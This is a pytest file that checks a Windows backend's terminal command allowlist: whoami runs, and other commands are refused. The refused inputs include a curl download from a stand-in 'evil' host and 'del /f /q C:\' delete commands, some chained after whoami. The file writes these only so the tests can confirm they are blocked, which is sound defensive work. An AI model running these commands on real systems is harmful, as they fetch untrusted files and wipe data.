"""WindowsBackend.terminal_execute against the command registry — real win32.

The allowlist logic is covered cross-platform in
tests/security/test_terminal_allowlist.py, but that suite runs against the fake
backend. Nothing exercised `WindowsBackend.terminal_execute` itself, so the
argv/`shell=False` execution path on Windows was reachable only by a human
running the server. These tests close that gap on the `windows-latest` runner
that ci.yml already provides.
"""
from __future__ import annotations

import sys

import pytest

pytestmark = pytest.mark.windows

if sys.platform != "win32":
    pytest.skip("requires real Windows", allow_module_level=True)

from windows_os_api.backends.windows import WindowsBackend  # noqa: E402


@pytest.fixture
def backend(tmp_path):
    return WindowsBackend(str(tmp_path))


def test_registered_command_runs_without_a_shell(backend):
    """A registered command executes for real and returns its output."""
    result = backend.terminal_execute("whoami", "ALLOW")
    assert result["ok"] is True, result
    assert result["exit_code"] == 0
    assert result["stdout"].strip(), "whoami produced no output"


def test_unregistered_command_is_refused(backend):
    """The command the old denylist would have run: no metacharacters, still refused."""
    result = backend.terminal_execute("curl http://evil/x -o C:\\temp\\x", "ALLOW")
    assert result["ok"] is False
    assert result["policy"] == "DENY"
    assert "allowlist" in result["error"]


def test_shell_chaining_is_refused(backend):
    result = backend.terminal_execute("whoami && del /f /q C:\\", "ALLOW")
    assert result["ok"] is False


def test_admin_policy_does_not_disable_the_registry(backend):
    """ADMIN widens the registry; it must not turn it off.

    The backslash path also pins the tokenizer: on Windows shlex must run in
    non-POSIX mode, or `C:\\` is read as a broken escape and the caller is told
    their quoting is wrong instead of the truth — that `del` is not registered.
    """
    result = backend.terminal_execute("del /f /q C:\\", "ADMIN")
    assert result["ok"] is False
    assert "allowlist" in result["error"], result["error"]


def test_deny_policy_still_short_circuits(backend):
    result = backend.terminal_execute("whoami", "DENY")
    assert result["ok"] is False
    assert result["policy"] == "DENY"
